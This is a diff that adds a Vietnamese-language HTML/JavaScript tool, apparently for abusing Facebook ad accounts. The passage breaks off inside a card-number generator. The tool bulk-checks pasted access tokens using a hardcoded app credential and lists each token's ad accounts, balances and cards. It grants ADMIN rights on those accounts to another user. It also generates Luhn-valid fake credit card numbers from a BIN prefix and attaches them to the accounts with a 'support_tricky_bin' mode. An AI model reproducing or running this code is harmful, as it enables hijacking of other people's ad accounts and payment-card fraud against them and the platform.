@@ -1,0 +1,881 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TOOL ADD THẺ ADS</title>
+    <!-- Bootstrap core CSS -->
+    <!-- <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script> -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.3/umd/popper.min.js" integrity="sha384-vFJXuSJphROIrBnz7yo7oB41mKfc8JzQZiCq4NCceLEaO4IHwicKwpJf9c9IpFgh" crossorigin="anonymous"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/js/bootstrap.min.js" integrity="sha384-alpBpkh1PFOepccYVYDB4do5UnbKysX5WZXm3XxPqe5iKTfUKjNkCk9SaVuEZflJ" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap-switch/3.3.4/js/bootstrap-switch.min.js" integrity="sha256-AKUJYz2DyEoZYHh2/+zPHm1tTdYb4cmG8HC2ydmTzM4=" crossorigin="anonymous"></script>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/css/bootstrap.min.css" integrity="sha384-PsH8R72JQ3SOdhVi3uxftmaW6Vc51MKb0q5P2rRUpPvrszuE4W1povHYgTpBfshb" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap-switch/3.3.4/css/bootstrap3/bootstrap-switch.min.css" integrity="sha256-sj3qkRTZIL8Kff5fST1TX0EF9lEmSfFgjNvuiw2CV5w=" crossorigin="anonymous">
+    <link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.datatables.net/1.10.16/css/dataTables.bootstrap4.min.css">
+    <script src="https://cdn.datatables.net/1.10.16/js/jquery.dataTables.min.js"></script>
+    <script src="https://cdn.datatables.net/1.10.16/js/dataTables.bootstrap4.min.js"></script>
+    <script src="https://cdn.datatables.net/fixedheader/3.1.3/js/dataTables.fixedHeader.min.js"></script>
+    <script src="https://cdn.datatables.net/select/1.2.4/js/dataTables.select.min.js"></script>
+    <link rel="stylesheet" type="text/css" href="https://cdn.datatables.net/select/1.2.4/css/select.bootstrap4.min.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.datatables.net/buttons/1.5.1/css/buttons.bootstrap4.min.css">
+    <script src="https://cdn.datatables.net/buttons/1.5.1/js/dataTables.buttons.min.js"></script>
+    <script src="https://cdn.datatables.net/buttons/1.5.1/js/buttons.bootstrap4.min.js"></script>
+    <script src="https://cdn.datatables.net/buttons/1.5.1/js/buttons.html5.min.js"></script>
+    <script src="https://cdn.datatables.net/buttons/1.5.1/js/buttons.print.min.js"></script>
+    <script src="https://cdn.datatables.net/buttons/1.5.1/js/buttons.colVis.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.1.3/jszip.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/pdfmake/0.1.32/pdfmake.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/pdfmake/0.1.32/vfs_fonts.js"></script>
+
+    <style>
+    /* Absolute Center Spinner */
+
+    .loading {
+        position: fixed;
+        z-index: 999;
+        height: 2em;
+        width: 2em;
+        overflow: show;
+        margin: auto;
+        top: 0;
+        left: 0;
+        bottom: 0;
+        right: 0;
+    }
+    /* Transparent Overlay */
+
+    .loading:before {
+        content: '';
+        display: block;
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background-color: rgba(0, 0, 0, 0.3);
+    }
+    /* :not(:required) hides these rules from IE9 and below */
+
+    .loading:not(:required) {
+        /* hide "loading..." text */
+        font: 0/0 a;
+        color: transparent;
+        text-shadow: none;
+        background-color: transparent;
+        border: 0;
+    }
+
+    .loading:not(:required):after {
+        content: '';
+        display: block;
+        font-size: 10px;
+        width: 1em;
+        height: 1em;
+        margin-top: -0.5em;
+        -webkit-animation: spinner 1500ms infinite linear;
+        -moz-animation: spinner 1500ms infinite linear;
+        -ms-animation: spinner 1500ms infinite linear;
+        -o-animation: spinner 1500ms infinite linear;
+        animation: spinner 1500ms infinite linear;
+        border-radius: 0.5em;
+        -webkit-box-shadow: rgba(0, 0, 0, 0.75) 1.5em 0 0 0, rgba(0, 0, 0, 0.75) 1.1em 1.1em 0 0, rgba(0, 0, 0, 0.75) 0 1.5em 0 0, rgba(0, 0, 0, 0.75) -1.1em 1.1em 0 0, rgba(0, 0, 0, 0.5) -1.5em 0 0 0, rgba(0, 0, 0, 0.5) -1.1em -1.1em 0 0, rgba(0, 0, 0, 0.75) 0 -1.5em 0 0, rgba(0, 0, 0, 0.75) 1.1em -1.1em 0 0;
+        box-shadow: rgba(0, 0, 0, 0.75) 1.5em 0 0 0, rgba(0, 0, 0, 0.75) 1.1em 1.1em 0 0, rgba(0, 0, 0, 0.75) 0 1.5em 0 0, rgba(0, 0, 0, 0.75) -1.1em 1.1em 0 0, rgba(0, 0, 0, 0.75) -1.5em 0 0 0, rgba(0, 0, 0, 0.75) -1.1em -1.1em 0 0, rgba(0, 0, 0, 0.75) 0 -1.5em 0 0, rgba(0, 0, 0, 0.75) 1.1em -1.1em 0 0;
+    }
+    /* Animation */
+
+    @-webkit-keyframes spinner {
+        0% {
+            -webkit-transform: rotate(0deg);
+            -moz-transform: rotate(0deg);
+            -ms-transform: rotate(0deg);
+            -o-transform: rotate(0deg);
+            transform: rotate(0deg);
+        }
+        100% {
+            -webkit-transform: rotate(360deg);
+            -moz-transform: rotate(360deg);
+            -ms-transform: rotate(360deg);
+            -o-transform: rotate(360deg);
+            transform: rotate(360deg);
+        }
+    }
+
+    @-moz-keyframes spinner {
+        0% {
+            -webkit-transform: rotate(0deg);
+            -moz-transform: rotate(0deg);
+            -ms-transform: rotate(0deg);
+            -o-transform: rotate(0deg);
+            transform: rotate(0deg);
+        }
+        100% {
+            -webkit-transform: rotate(360deg);
+            -moz-transform: rotate(360deg);
+            -ms-transform: rotate(360deg);
+            -o-transform: rotate(360deg);
+            transform: rotate(360deg);
+        }
+    }
+
+    @-o-keyframes spinner {
+        0% {
+            -webkit-transform: rotate(0deg);
+            -moz-transform: rotate(0deg);
+            -ms-transform: rotate(0deg);
+            -o-transform: rotate(0deg);
+            transform: rotate(0deg);
+        }
+        100% {
+            -webkit-transform: rotate(360deg);
+            -moz-transform: rotate(360deg);
+            -ms-transform: rotate(360deg);
+            -o-transform: rotate(360deg);
+            transform: rotate(360deg);
+        }
+    }
+
+    @keyframes spinner {
+        0% {
+            -webkit-transform: rotate(0deg);
+            -moz-transform: rotate(0deg);
+            -ms-transform: rotate(0deg);
+            -o-transform: rotate(0deg);
+            transform: rotate(0deg);
+        }
+        100% {
+            -webkit-transform: rotate(360deg);
+            -moz-transform: rotate(360deg);
+            -ms-transform: rotate(360deg);
+            -o-transform: rotate(360deg);
+            transform: rotate(360deg);
+        }
+    }
+    .container {
+    max-width: 1300px;
+    }
+    .points_table td {
+        padding: 10px;
+        text-align: left;
+    }
+    .points_table td:nth-child(1),
+    .points_table th:nth-child(1) {
+        min-width: 10px;
+    }
+    .points_table td:nth-child(2),
+    .points_table th:nth-child(2) {
+        min-width: 140px;
+    }
+    .points_table td:nth-child(3),
+    .points_table th:nth-child(3) {
+        min-width: 10px;
+    }
+    .points_table td:nth-child(4),
+    .points_table th:nth-child(4) {
+        min-width: 100px;
+    }
+    .points_table td:nth-child(5),
+    .points_table th:nth-child(5) {
+        min-width: 80px;
+    }
+    .points_table td:nth-child(6),
+    .points_table th:nth-child(6) {
+        min-width: 70px;
+    }
+    .points_table td:nth-child(7),
+    .points_table th:nth-child(7) {
+        width : 10px;
+    }
+    .points_table td:nth-child(8),
+    .points_table th:nth-child(8) {
+        min-width : 70px;
+    }
+    .points_table td:nth-child(9),
+    .points_table th:nth-child(9) {
+        min-width : 70px;
+    }
+    .points_table td:nth-child(10),
+    .points_table th:nth-child(10) {
+        min-width : 30px;
+    }
+    .points_table td:nth-child(11),
+    .points_table th:nth-child(11) {
+        min-width : 10px;
+    }
+    .points_table td:nth-child(12),
+    .points_table th:nth-child(12) {
+        min-width : 10px;
+    }
+    .points_table thead {
+        background: #8d8a97;
+        color: #fff;
+    }
+    .old_ie_wrapper {
+        height: 100px;
+        width: 900px;
+        overflow-x: auto;
+        overflow-y: auto;
+    }
+    .old_ie_wrapper tbody {
+        height: auto;
+    }
+
+</style>
+</head>
+
+<body>
+    <main role="main">
+        <div class="container" style="background-color: #e9ecef;">
+            <div class="row">
+                <div class="form-group col-md-12">
+                    <textarea rows="6"  style="font-size: 13px;resize: auto;" name="list_tokens" id="list_tokens" class="form-control" placeholder="EAAAAUaZA8jlABAHQ0&#13;&#10;EAAAAUaZA8jlABAHQ0"></textarea>
+                </div>
+                <div class="form-group col-sm-12">
+                    <div class="panel panel-primary">
+                        <div class="panel-heading">
+                            <h5 class="panel-title">Chọn tài khoản Ads| <span id="info_token">Name:|ID:</span><span id="info_token_ads">Có 0 TK ADS</span></h4>
+                        </div>
+                        <div class="panel-body row" style=" margin-bottom: -20px;">
+                            <div class="form-group col-md-4">
+                                <input name="token_person" id="token_person" class="form-control" placeholder="Người lạ">
+                            </div>
+                            <div class="form-group col-md-4">
+                                <div class="row">
+                                    <div class="text-left col-md-9">
+                                        <button type="button" class="btn btn-success" id="add">Share Quyền</button>
+                                        <button type="button" class="btn btn-danger" id="delete">Xóa quyền</button>
+                                    </div>
+                                    <div class="col-md-3">
+                                        <button type="button" class="btn btn-primary" id="check_list" autofocus>Check Token</button>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="col-md-4 ">
+                            	<div class="add-the" style="display:-webkit-inline-box;">
+                                    <input name="prefix_card" id="prefix_card" placeholder="Đầu thẻ" value="" style="max-width: 75%;margin-right: 15px;margin-left: 15px;" class="form-control">
+                                    <button type="button" class="btn btn-primary" id="add_the" style="">Add Thẻ</button>
+                                    <button type="button" class="btn btn-primary" id="load_ads" style="display: none;">Load ADS</button>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="form-group col-sm-12" id="log">
+                    <div class="panel panel-primary">
+                        <div class="panel-heading text-center">
+                            <h4 class="panel-title">DANH SÁCH TÀI KHOẢN ADS</h4>
+                        </div>
+                        <div class="panel-body row">
+                            <div class="col-sm-12 text-right"style=" overflow: auto;">
+                                <table class="table points_table table-striped table-bordered" cellspacing="0" style="font-size: 13px;" id="tbDSAccount">
+                                </table>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+</body>
+<!-- Set -->
+<script type="text/javascript">
+var list_adaccount_id = [];
+var list_accounts = [];
+var list_tokens = [];
+var set_ads_person = {};
+var stt = 0;
+var max = 0;
+var tbDSAccount;
+$(document).ready(function() {
+    toastr.options = {
+        closeButton: !0,
+        debug: !1,
+        progressBar: !0,
+        positionClass: "toast-top-left",
+        onclick: null,
+        showDuration: "400",
+        hideDuration: "500",
+        timeOut: "2000",
+        extendedTimeOut: "750",
+        showEasing: "swing",
+        hideEasing: "linear",
+        showMethod: "fadeIn",
+        hideMethod: "fadeOut"
+    };
+    $(".loading").hide();
+    if (localStorage.prefix_card)  $('#prefix_card').val(localStorage.prefix_card);
+    if (localStorage.set_ads_token)  {
+        $('#token_person').val(localStorage.set_ads_token);
+        LoadTokenSetADS();
+    }
+    if (localStorage.list_tokens)  $('#list_tokens').val(localStorage.list_tokens);
+    tbDSAccount = $('#tbDSAccount').DataTable({
+        retrieve: true,
+        // fixedHeader: true,
+        "scrollX": true,
+        select: true,
+        // lengthChange: false,
+        "lengthMenu": [[10, 50, 100, -1], [10, 50, 100, "All"]],
+        columns: [
+           {  "data": "index", title: "#" },
+           {
+               "data": "token",
+               title: "Token",
+               "render": function ( data, type, row ) {
+                   return data.substring(0,20)+"...";
+               }
+           },
+           { "data": "status", title: "Status" },
+           { "data": "name", title: "Name", "visible": false },
+           { "data": "ad_account_id", title: "AdAccountID" },
+           { "data": "balance", title: "Balance" },
+           { "data": "currency", title: "Currency" },
+           { "data": "timezone", title: "Timezone", "visible": false },
+           { "data": "card", title: "Card" },
+           { "data": "ad_account_status", title: "AdStatus" },
+           //"searchable": false title: "N.Admin", "visible": false,
+       ],
+       // "columnDefs": [
+       //     {
+               // The `data` parameter refers to the data for the cell (defined by the
+               // `data` option, which defaults to the column being worked with, in
+               // this case `data: 0`.
+               // "render": function ( data, type, row ) {
+                   // console.log(type);
+                   // return data.substring(0,20)+"...";
+               // },
+               // "targets": 1
+           // }
+           // { "visible": false,  "targets": [ 3 ] }
+       // ],
+        buttons: [
+            {
+                extend: 'collection',
+                text: 'Export',
+                name: 'export',
+                buttons: ['copy', 'excel', 'pdf']
+            },
+            'colvis',
+            {
+                extend: 'collection',
+                text: 'Select ADS',
+                name: 'selectAds',
+                buttons: []
+            }
+        ],
+        rowGroup: {
+           dataSrc: 1
+        }
+    });
+    tbDSAccount.buttons().container().appendTo( '#tbDSAccount_wrapper .dataTables_length' );
+    $(".add-the").appendTo( '#tbDSAccount_wrapper .dataTables_length' );
+    $('#tbDSAccount_wrapper .col-md-6:eq(0)').removeClass('col-md-6').addClass('col-md-9').addClass('text-left');//
+    $('#tbDSAccount_wrapper .col-md-6:eq(0)').removeClass('col-md-6').addClass('col-md-3');
+});
+$('#token_person').change(function() {
+    LoadTokenSetADS();
+});
+$('#prefix_card').change(function(event) {
+    localStorage.prefix_card = $('#prefix_card').val();
+});
+$('#list_tokens').change(function(event) {
+    localStorage.list_tokens = $('#list_tokens').val();
+});
+$('#check_list').click(function(data) {
+    list_accounts = [];
+    limitFund = [];
+    list_ads_status = [];
+    tbDSAccount.clear().draw();
+    stt = 0;
+    try{
+        if ($('#list_tokens').val() == "") return;
+        var list_tokens = $('#list_tokens').val().trim().split("\n");
+        var postData = [];
+        list_tokens.forEach(function(token){
+            if (token.includes("AA") == true && token.length>150){
+                postData.push({
+                    method: "POST",
+                    body: 'q=Query A {viewer() {actor{name,id,},ad_accounts{nodes{id,legacy_account_id,name,account_status,ads_account_currency_fx_ratio_to_usd,balance{offset_amount},billing_threshold_amount{formatted,offset_amount},currency,payment_info,has_funding_source,spend_info{spend_limit,amount_spent},timezone_info{timezone,timezone_id}}}}}',
+                    relative_url: "/graphql?access_token="+token  // chi de access_token= o cuoi k se loi doi duoi
+                });
+            }
+        });
+        if (postData.length == 0){
+            toastr.error("Tao deo thay cai token nao ca");
+        }
+        else {
+            ToggleHideButton(true);
+            toastr.success("Bat dau check token yeu cau doi.");
+            fetch("https://b-graph.facebook.com/v2.11/?decode_body_json=false&streamable_json_response=true&locale=en_US&client_country_code=US",{
+                method: "POST",
+                headers: {
+                  'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+                  'Content-Type': 'application/x-www-form-urlencoded'
+                },
+                body: "batch=" + encodeURIComponent(JSON.stringify(postData))
+            }).then(respone=>{
+                return respone.json().then(responeJson=>{
+                    responeJson.forEach((data, index) =>{
+                        stt++;
+                        if (data[0].code == 200){
+                            console.log("#"+stt+"|"+data[1].body.viewer.actor.id+"|"+postData[index].relative_url.split('=')[postData[index].relative_url.split('=').length-1]);
+                            var account = {
+                                id: data[1].body.viewer.actor.id,
+                                name: data[1].body.viewer.actor.name,
+                                token: postData[index].relative_url.split('=')[postData[index].relative_url.split('=').length-1],
+                                ad_accounts: data[1].body.viewer.ad_accounts.nodes.length > 0 ? data[1].body.viewer.ad_accounts.nodes: null
+                            };
+                            list_accounts.push(account);
+                            data[1].body.viewer.ad_accounts.nodes.forEach(ad_account => {
+                                if (ad_account.billing_threshold_amount && limitFund.indexOf(ad_account.billing_threshold_amount.formatted) == -1) {
+                                    limitFund.push(ad_account.billing_threshold_amount.formatted);
+                                }
+                                if (list_ads_status.indexOf(ad_account.account_status) == -1) {
+                                    list_ads_status.push(ad_account.account_status);
+                                }
+                                tbDSAccount.row.add({
+                                    index: stt,
+                                    token: account.token,
+                                    status: '<div style="color:rgb(24, 132, 51)">LIVE</div>',
+                                    name: account.name,
+                                    ad_account_id: ad_account.legacy_account_id,
+                                    balance: ad_account.spend_info.amount_spent.amount+'|'+(ad_account.billing_threshold_amount? ad_account.billing_threshold_amount.formatted:'0'),
+                                    currency: ad_account.currency,
+                                    timezone: ad_account.timezone_info.timezone,
+                                    card: ad_account.payment_info.includes("not")? '...': ad_account.payment_info,
+                                    ad_account_status: ad_account.account_status
+                                }).draw(false);
+                            });
+                        }
+                        else{
+                            console.log("#"+stt+"|"+ data[1].body.error.message);
+                            tbDSAccount.row.add({
+                                index: stt,
+                                token: postData[index].relative_url.split('=')[postData[index].relative_url.split('=').length-1],
+                                status: '<div style="color:rgb(242, 21, 21)">DIE</div>',
+                                name: '',
+                                ad_account_id: '',
+                                balance: '',
+                                currency: '',
+                                timezone: '',
+                                card: '',
+                                ad_account_status: ''
+                            }).draw(false);
+                        }
+                    });
+                    toastr.success("Done! Check Token.");
+                    $("#log").css("display", "block");
+                    // $('#load_ads').click();
+                    ToggleHideButton(false);
+                    tbDSAccount.button('selectAds:name').remove();
+                    var buttons = [];
+                    buttons.push({
+                        text: 'Unselect',
+                        action: ()=>ToggleChangeSelectAct("un|all")
+                    },{
+                        text: 'Un.Card',
+                        action: ()=>ToggleChangeSelectAct("un|card")
+                    },{
+                        text: 'Card',
+                        action: ()=>ToggleChangeSelectAct("card")
+                    },{
+                        text: 'Un.$ KXD',
+                        action: ()=>ToggleChangeSelectAct("un|0")
+                    },{
+                        text: '$ KXD',
+                        action: ()=>ToggleChangeSelectAct("0")
+                    });
+                    $.each(limitFund, function(i, eval) {
+                        buttons.push({
+                            text: 'Un.'+eval,
+                            action: ()=>ToggleChangeSelectAct("un|" + eval)
+                        });
+                        buttons.push({
+                            text: eval,
+                            action: ()=>ToggleChangeSelectAct(eval)
+                        });
+                    });
+                    $.each(list_ads_status, function(i, eval) {
+                        buttons.push({
+                            text: 'Un.'+eval,
+                            action: ()=>ToggleChangeSelectAct("un|" + eval)
+                        });
+                        buttons.push({
+                            text: eval,
+                            action: ()=>ToggleChangeSelectAct(eval)
+                        });
+                    });
+                    buttons.push({
+                        text: 'Select All',
+                        action: ()=>ToggleChangeSelectAct("all")
+                    });
+                    tbDSAccount.button().add(2,{
+                        extend: 'collection',
+                        text: 'Select ADS',
+                        name: 'selectAds',
+                        buttons
+                    });
+                });
+            });
+        }
+    }
+    catch(err){
+        toastr.error("Lỗi không cắt được input \n"+err);
+    }
+});
+function addEventJquery(){
+    // $(".check_act").off('change');
+    // $(".check_act").change(function() {
+    //     copyDanhSachADS();
+    // });
+}
+function copyDanhSachADS(){
+    // list_adaccount_id = [];
+    // $(".check_act:checked").each(function(i) {
+    //         var temp_row = $(this).closest("tr");
+    //         var account = list_accounts.find(i => i.adaccount.id === temp_row.find("td:nth-child(5)").text());
+    //         if (account) list_adaccount_id.push(account.adaccount.id.split("_")[1]+':0');
+    // });
+    // copyTextToClipboard(list_adaccount_id.join("\n"));
+    // toastr.success("Đã copy!");
+}
+$('#add_the').click(function(data) {
+    var prefix_card = $('#prefix_card').val().trim();
+    if (prefix_card == ""){
+        toastr.error("Vui Lòng Nhập Đầu Thẻ");
+        return;
+    }
+    var rowsSelected = tbDSAccount.rows( {selected:true} ).data();
+    var postData = [];
+    toastr.success("Bat Dau Add The");
+    if (rowsSelected.length == 0){
+        toastr.error("Không có gì để mà add thẻ");
+        return;
+    }
+    ToggleHideButton(true);
+    var count  = 0;
+    var reloaded = false;
+    rowsSelected.each(function(rowData) {
+        // prefix_card++;
+        var creditCardNumber = credit_card_number(prefix_card.split("|")[0].substr(0,15), 16, 1)[0];
+        var creditCardMonth = prefix_card.split("|").length > 1 ? prefix_card.split("|")[1]:'10';
+        var creditCardYear = prefix_card.split("|").length > 2 ? prefix_card.split("|")[2].length == 2 ? '20'+ prefix_card.split("|")[2]:prefix_card.split("|")[2]:'2021';
+        var creditCardCSC = prefix_card.split("|").length > 3 ? prefix_card.split("|")[3]:'110';
+        fetch('https://graph.secure.facebook.com/ajax/payment/token_proxy.php?tpe=/v5.0/act_'+rowData.ad_account_id+'/credit_cards?locale=user', {
+            method: "POST",
+            headers: {
+                // 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+                'Content-Type': 'application/x-www-form-urlencoded',
+                // 'Accept-Encoding': 'gzip;q=0,deflate;q=0',
+            },
+            body: 'creditCardNumber='+creditCardNumber+'&csc='+creditCardCSC+'&expiry_month='+creditCardMonth+'&expiry_year='+creditCardYear+'&billing_address=%7B%22zip%22%3A%22'+Date.now().toString().substr(8,5)+'%22%2C%22country_code%22%3A%22VN%22%7D&auth_mode=support_tricky_bin&access_token=' +  rowData.token + '&payment_type=ads_invoice'
+        }).then(function(respone) {
+            ++count;
+            return respone.json().then(function(respone_json) {
+                if (respone_json.error) toastr.error(rowData.ad_account_id+"|"+respone_json.error.message);
+                else toastr.success("Add ok:" + rowData.ad_account_id);
+                if (count == rowsSelected.length){
+                    if (reloaded == true) return;
+                    reloaded = true;
+                    toastr.success("Xong ");
+                    $('#prefix_card').val(prefix_card);
+                    localStorage.prefix_card = prefix_card;
+                    $('#check_list').trigger('click');
+                    ToggleHideButton(false);
+                    ToggleChecked(false);
+                }
+            });
+        });
+    });
+})
+$('#add').click(function(data) {
+    var target_id = set_ads_person.id;
+    toastr.success("Bat Dau Set Quyen cho " +target_id);
+    ToggleHideButton(true);
+    var rowsSelected = tbDSAccount.rows( {selected:true} ).data();
+    //list_adaccount_id = [];
+    if (rowsSelected.length == 0){
+        toastr.error("Hình Như Chua chon gi ca");
+        ToggleHideButton(false);
+        return;
+    };
+    stt = 0;
+    max = rowsSelected.length;
+    var postData = [];
+    rowsSelected.each(function(rowData) {
+        postData.push({
+            method: "POST",
+            body: 'role=ADMIN&user=' + target_id,
+            relative_url: '/v3.0/act_' + rowData.ad_account_id + '/userpermissions?access_token=' + rowData.token
+        });
+    });
+    fetch("https://b-graph.facebook.com/?decode_body_json=true&streamable_json_response=true&locale=en_US&client_country_code=US",{
+        method: "POST",
+        headers: {
+          'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+          'Content-Type': 'application/x-www-form-urlencoded'
+        },
+        body: "batch=" + encodeURIComponent(JSON.stringify(postData))
+    }).then(respone=>{
+        return respone.json().then(responeJson=>{
+            var done_count = 0;
+            var fail_count = 0;
+            responeJson.forEach((data, index) =>{
+                if (Array.isArray(data) && data[0].code == 200){
+                    done_count++;
+                }
+                else {
+                    fail_count++;
+                }
+            });
+            toastr.success("Done: " + done_count + " |Fail: " + fail_count);
+            LoadTokenSetADS();
+            toastr.success("Da set cac acc cho nguoi nhan");
+            ToggleHideButton(false);
+            ToggleChecked(false);
+        });
+    });
+})
+$('#delete').click(function(data) {
+    ToggleHideButton(true);
+    var rowsSelected = tbDSAccount.rows( {selected:true} ).data();
+    //list_adaccount_id = [];
+    if (rowsSelected.length == 0){
+        toastr.error("Hình Như Chua chon gi ca");
+        ToggleHideButton(false);
+        return;
+    };
+    var count = 0;
+    var max = rowsSelected.length;
+    var postData = [];
+    rowsSelected.each(function(rowData) {
+        var target_id = set_ads_person.id?set_ads_person.id:list_accounts.find(i => i.token == rowData.token).id;
+        $.get('https://graph.facebook.com/v3.0/act_' + rowData.ad_account_id + '/userpermissions?user=' + target_id + '&access_token=' + rowData.token + '&format=json&method=delete').done(function(data) {
+            toastr.success("Thành công, xóa " + rowData.ad_account_id);
+        }).fail(function(response) {
+            toastr.error("Thất bại, xóa " + rowData.ad_account_id);
+            console.log(response.responseText);
+        }).always(function(){
+            count++;
+            if (stt >= max){
+                LoadTokenSetADS();
+            }
+        });
+    });
+    setTimeout(function(){ToggleHideButton(false);}, 2000);
+    ToggleChecked(false);
+});
+function LoadTokenSetADS(){
+    var token = $("#token_person").val().trim();
+    if (token!= "" &&  token.includes("AA") == true && token.length>150){
+        console.log("Đã nhập token acc set"+token);
+        toastr.success("Đang load TK Set ADS");
+        $.get('https://graph.facebook.com/v2.11/me?fields=id,name,adaccounts.limit(1).summary(total_count){business{id},funding_source_details,account_status,id,currency,amount_spent,balance,name,timezone_name,min_billing_threshold,users,user_role,is_oba_opt_out}&access_token='+token, function(res){
+            set_ads_person = res;
+            set_ads_person.token = token;
+            $('#info_token').html(res.name + "|" + res.id);
+            $('#info_token_ads').html('|Có: ' + res.adaccounts.summary.total_count +" tài khoản ads.");
+            toastr.success("Da load xong token set ads!");
+        }).fail(function(){
+            toastr.error("Token lỗi");
+            $('#info_token').html("Name:|ID:");
+            $('#info_token_ads').html('|Có: 0 tài khoản ads.');
+            set_ads_person = {};
+        });
+    }
+    else
+    {
+        $('#info_token').html("Name:|ID:");
+        $('#info_token_ads').html('|Có: 0 tài khoản ads.');
+        set_ads_person = {};
+    }
+    localStorage.set_ads_token = token;
+}
+function ToggleHideButton(value){
+    $(':button').prop('disabled', value);
+}
+function ToggleChangeSelectAct(value){
+    var uncheck  = false;
+    var selected_value = "";
+    if (value.split("|")[0] == "un"){
+        selected_value = value.split("|")[1];
+        uncheck = true;
+    }
+    else {
+        selected_value = value;
+    }
+    console.log("Đã "+(uncheck==true?'uncheck ':'') + selected_value);
+    tbDSAccount.data().each((rowData, index)=>{
+        if (rowData.ad_account_status == selected_value||rowData.balance.split("|")[1] == selected_value|| (selected_value == "card" && rowData.card !== '...' && rowData.card !== "")||selected_value == "all"){// rowData.balance.split("|")[1] == selected_value?
+             if (uncheck) tbDSAccount.rows(index, {order:'index'}).deselect(); else tbDSAccount.rows(index, {order:'index'}).select();
+        }
+    });
+    copyDanhSachADS();
+}
+function ToggleChecked(status) {
+    if(status) tbDSAccount.rows().select(); else tbDSAccount.rows().deselect();
+}
+function checkStatus(status) {
+    var res = "";
+    switch (status.toString()) {
+        case "1":
+        res = "ACTIVE";
+        break;
+        case "2":
+        res = "DISABLED";
+        break;
+        case "3":
+        res = "UNSETTLED";
+        break;
+        case "7":
+        res = "PENDING RISK REVIEW";
+        break;
+        case "9":
+        res = "IN GRACE PERIOD";
+        break;
+        case "100":
+        res = "PENDING CLOSURE";
+        break;
+        case "101":
+        res = "CLOSED";
+        break;
+        case "102":
+        res = "PENDING SETTLEMENT";
+        break;
+        case "201":
+        res = "ANY ACTIVE";
+        break;
+        case "202":
+        res = "ANY CLOSED";
+        break;
+        default:
+        res = "Error!";
+    }
+    return res;
+}
+function checkRoleUser(role) {
+    var res = "";
+    switch (role) {
+        case "281423141961500":
+        res = "Admin";
+        break;
+        case "":
+        res = "";
+        break;
+        case "":
+        res = "";
+        break;
+        default:
+        res = "Error!";
+    }
+    return res;
+}
+function copyTextToClipboard(text) {
+    var textArea = document.createElement("textarea");
+
+    //
+    // *** This styling is an extra step which is likely not required. ***
+    //
+    // Why is it here? To ensure:
+    // 1. the element is able to have focus and selection.
+    // 2. if element was to flash render it has minimal visual impact.
+    // 3. less flakyness with selection and copying which **might** occur if
+    //    the textarea element is not visible.
+    //
+    // The likelihood is the element won't even render, not even a flash,
+    // so some of these are just precautions. However in IE the element
+    // is visible whilst the popup box asking the user for permission for
+    // the web page to copy to the clipboard.
+    //
+
+    // Place in top-left corner of screen regardless of scroll position.
+    textArea.style.position = 'fixed';
+    textArea.style.top = 0;
+    textArea.style.left = 0;
+
+    // Ensure it has a small width and height. Setting to 1px / 1em
+    // doesn't work as this gives a negative w/h on some browsers.
+    textArea.style.width = '2em';
+    textArea.style.height = '2em';
+
+    // We don't need padding, reducing the size if it does flash render.
+    textArea.style.padding = 0;
+
+    // Clean up any borders.
+    textArea.style.border = 'none';
+    textArea.style.outline = 'none';
+    textArea.style.boxShadow = 'none';
+
+    // Avoid flash of white box if rendered for any reason.
+    textArea.style.background = 'transparent';
+
+
+    textArea.value = text;
+
+    document.body.appendChild(textArea);
+
+    textArea.select();
+
+    try {
+        var successful = document.execCommand('copy');
+        var msg = successful ? 'successful' : 'unsuccessful';
+        console.log('Copying text command was ' + msg);
+    } catch (err) {
+        console.log('Oops, unable to copy');
+    }
+
+    document.body.removeChild(textArea);
+}
+function strrev(str) {
+    if (!str) return '';
+    var revstr='';
+    for (var i = str.length-1; i>=0; i--)
+    revstr+=str.charAt(i)
+    return revstr;
+}
+function completed_number(prefix, length) {
+    var ccnumber = prefix;
+    // generate digits
+    while ( ccnumber.length < (length - 1) ) {
+        ccnumber += Math.floor(Math.random()*10);
+    }
+    // reverse number and convert to int
+    var reversedCCnumberString = strrev( ccnumber );
+    var reversedCCnumber = new Array();
+    for ( var i=0; i < reversedCCnumberString.length; i++ ) {
+        reversedCCnumber[i] = parseInt( reversedCCnumberString.charAt(i) );
+    }
+    // calculate sum
+    var sum = 0;
+    var pos = 0;
+    while ( pos < length - 1 ) {
+        var odd = reversedCCnumber[ pos ] * 2;
+        if ( odd > 9 ) {
+            odd -= 9;
+        }
+        sum += odd;
+        if ( pos != (length - 2) ) {
+            sum += reversedCCnumber[ pos +1 ];
+        }
+        pos += 2;
+    }
+    // calculate check digit
+    var checkdigit = (( Math.floor(sum/10) + 1) * 10 - sum) % 10;
+    ccnumber += checkdigit;
